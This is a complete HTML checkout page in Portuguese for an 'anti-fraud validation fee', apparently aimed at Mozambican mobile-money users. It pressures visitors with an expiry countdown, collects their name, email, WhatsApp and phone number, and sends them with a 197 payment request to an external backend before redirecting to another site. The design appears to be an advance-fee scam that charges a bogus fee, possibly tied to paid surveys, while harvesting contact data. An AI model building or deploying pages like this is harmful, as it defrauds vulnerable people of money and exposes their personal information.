<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Taxa Anti-Fraude</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body { background-color: #d1d5db; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; }
    .constrained-width { max-width: 32rem; margin: auto; padding: 0 1rem; }
    .payment-option { flex: 1; text-align: center; border: 2px solid #ccc; padding: 12px; border-radius: 8px; cursor: pointer; background: white; transition: all 0.2s; }
    .payment-option.selected { border-color: #049D43; background-color: #e8f5e9; }
    #overlay-processando { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.7); display: none; justify-content: center; align-items: center; z-index: 9999; }
    .loader-circle { width: 140px; height: 140px; border: 10px solid #4ade80; border-top: 10px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; display: flex; justify-content: center; align-items: center; font-size: 32px; font-weight: bold; color: white; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div style="background-color: #111827; color: #fff; text-align: center; padding: 0.5rem; font-weight: 500; font-size: 0.9rem;">
    PAGAMENTO DA TAXA expira em: 01:56
  </div>

  <main id="checkout-container" class="space-y-6 pb-6">
    <header style="background-color: #1ed760; color: #ffffff;" class="w-full p-3 text-center text-sm font-semibold shadow-md">Taxa de Validação - Antifraude</header>

    <div class="constrained-width">
      <div class="w-full bg-gray-200 overflow-hidden rounded-[21px]">
        <img src="https://dlzpblyjxiqfa.cloudfront.net/205487289/checkout-builder/e7mbjaftavxzhavgt9ohra3s5" alt="Banner" class="w-full object-cover" />
      </div>
    </div>

    <div class="constrained-width">
      <div class="shadow-lg p-6 sm:p-8 bg-white rounded-[21px]">
        <h2 class="text-xl font-bold text-gray-800 mb-4">Identifique-se</h2>
        <div class="space-y-4">
          <div>
            <label class="block text-sm font-medium text-gray-600 mb-1">Nome e sobrenome</label>
            <input type="text" id="nome" class="w-full p-3 bg-gray-50 border border-gray-300 rounded-md" placeholder="Nome e sobrenome">
          </div>
          <div>
            <label class="block text-sm font-medium text-gray-600 mb-1">E-mail</label>
            <input type="email" id="email" class="w-full p-3 bg-gray-50 border border-gray-300 rounded-md" placeholder="E-mail">
          </div>
          <div>
            <label class="block text-sm font-medium text-gray-600 mb-1">WhatsApp</label>
            <input type="text" id="whatsapp" class="w-full p-3 bg-gray-50 border border-gray-300 rounded-md" placeholder="Número WhatsApp">
          </div>
        </div>
      </div>
    </div>

    <div class="constrained-width">
      <div class="shadow-lg p-6 sm:p-8 bg-white rounded-[21px]">
        <h2 class="text-xl font-bold text-gray-800 mb-4">Pagamento</h2>

        <div class="flex gap-2 mb-4">
          <div class="payment-option" onclick="selecionarMetodo(this, 'mpesa')">M-Pesa</div>
          <div class="payment-option" onclick="selecionarMetodo(this, 'emola')">e-Mola</div>
        </div>

        <div id="campo-telefone" style="display: none;" class="mb-4">
          <label class="block text-sm font-medium text-gray-600 mb-1">Número de telefone</label>
          <input type="text" id="telefone" class="w-full p-3 bg-gray-50 border border-gray-300 rounded-md" placeholder="84/85/86/87 xxxxxx">
        </div>

        <button onclick="enviarPagamento()" id="btn-pagar" class="w-full p-4 bg-[#1ed760] text-white font-bold text-lg uppercase rounded-[17px]">PAGAR TAXA</button>
      </div>
    </div>
  </main>

  <div id="overlay-processando">
    <div class="loader-circle">
      <span id="contador">45</span>
    </div>
  </div>

  <script>
    let metodoSelecionado = '';

    function selecionarMetodo(el, metodo) {
      metodoSelecionado = metodo;
      document.querySelectorAll('.payment-option').forEach(opt => opt.classList.remove('selected'));
      el.classList.add('selected');
      document.getElementById('campo-telefone').style.display = 'block';
    }

    function enviarPagamento() {
      const nome = document.getElementById('nome').value.trim();
      const email = document.getElementById('email').value.trim();
      const whatsapp = document.getElementById('whatsapp').value.trim();
      const telefone = document.getElementById('telefone').value.trim();
      const btn = document.getElementById('btn-pagar');

      if (!nome || !email || !whatsapp || !telefone || !metodoSelecionado) {
        alert('Preencha todos os campos.');
        return;
      }

      btn.disabled = true;
      document.getElementById('overlay-processando').style.display = 'flex';
      let tempo = 45;
      const contador = document.getElementById('contador');
      const intervalo = setInterval(() => {
        tempo--;
        contador.textContent = tempo;
        if (tempo <= 0) {
          clearInterval(intervalo);
          document.getElementById('overlay-processando').style.display = 'none';
          btn.disabled = false;
        }
      }, 1000);

      fetch('https://checkout-backend-production-4047.up.railway.app/api/pagar', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          nome, email, whatsapp,
          phone: telefone,
          metodo: metodoSelecionado,
          amount: "197",
          reference: "pesqui2"
        })
      })
      .then(res => res.json())
      .then(data => {
        clearInterval(intervalo);
        document.getElementById('overlay-processando').style.display = 'none';
        if (data.status === 'ok') {
          alert('Pagamento aprovado!');
          window.location.href = 'https://lifeboostsecrets.online/obg/';
        } else {
          alert('Erro: ' + (data.message || 'Falha ao processar pagamento'));
        }
      })
      .catch(err => {
        clearInterval(intervalo);
        document.getElementById('overlay-processando').style.display = 'none';
        alert('Erro inesperado.');
      });
    }
  </script>
</body>
</html>
